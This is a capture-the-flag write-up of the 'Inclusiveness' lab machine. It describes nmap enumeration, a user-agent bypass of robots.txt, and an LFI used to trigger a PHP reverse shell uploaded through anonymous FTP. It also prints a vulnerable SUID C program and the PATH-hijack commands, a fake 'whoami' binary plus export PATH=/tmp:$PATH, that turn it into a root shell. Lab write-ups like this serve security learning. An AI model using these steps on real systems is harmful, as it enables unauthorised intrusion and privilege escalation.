---
layout: default
title : muzec - Inclusiveness Writeup
---

![Image](https://imgur.com/VyujERM.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
Nmap scan report for 192.168.194.14
Host is up (0.28s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Apr 22 22:32 pub [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.49.194
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 06:1b:a3:92:83:a5:7a:15:bd:40:6e:0c:8d:98:27:7b (RSA)
|   256 cb:38:83:26:1a:9f:d3:5d:d3:fe:9b:a1:d3:bc:ab:2c (ECDSA)
|_  256 65:54:fc:2d:12:ac:e1:84:78:3e:00:23:fb:e4:c9:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.09 seconds
```

3 open ports let check out the FTP first but when i check it was empty only a pub folder so let move to port 80 but also checking the robots.txt first i got `You are not a search engine! You can't read my robots.txt! `

![Image](https://imgur.com/DTBIe7z.png)

Strange let try to mess with the user agent adding `Googlebot`.

![Image](https://imgur.com/p09S3bd.png)

Applying it and refreshing the page boom we have the directory and have access to the robots.txt.

![Image](https://imgur.com/uhgqn9Q.png)

![Image](https://imgur.com/jh92gGP.png)

So clicking on the english a strange looking URL probably a LFI or RFI vulnerable let try it.

![Image](https://imgur.com/efoIa9H.png)

And boom it vulnerable so i go back to the ftp and upload a reverse shell file in php.

![Image](https://imgur.com/jkSw5F0.png)

now let start a listener and access the file in the FTP path.

![Image](https://imgur.com/elj46kN.png)

Now let go back to our listener.

![Image](https://imgur.com/VwJNdr2.png)

Boom we have shell now let enumerate more.

```
#include <stdio.h>
    #include <unistd.h>
    #include <stdlib.h>
    #include <string.h>

    int main() {

        printf("checking if you are tom...\n");
        FILE* f = popen("whoami", "r");

        char user[80];
        fgets(user, 80, f);

        printf("you are: %s\n", user);
        //printf("your euid is: %i\n", geteuid());

        if (strncmp(user, "tom", 3) == 0) {
            printf("access granted.\n");
        setuid(geteuid());
            execlp("sh", "sh", (char *) 0);
        }
    }
```
Something interesting in the home directory And damn i I had difficulty exploiting this bug. It was a custom SUID binary owned by root! This was clearly the easiest way to escalate privileges. The program appeared to run the command "whoami", take the output of that command and store it in a buffer (user), then check if the first three bytes of that buffer were "tom". 

So i decided to create my own "whoami" binary that always returned "tom". I created the binary (also named whoami), changed my $PATH variable to first search in the /tmp/ directory for binaries, then executed the SUID rootshell to gain root privileges. 

```
echo '#include <stdio.h>' > whoami.c

echo 'main(){printf("tom");}' >> whoami.c

gcc whoami.c -o whoami && chmod +x whoami
```

Now `export PATH=/tmp:$PATH` .

![Image](https://imgur.com/4aosnmP.png)

Boom we are root.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
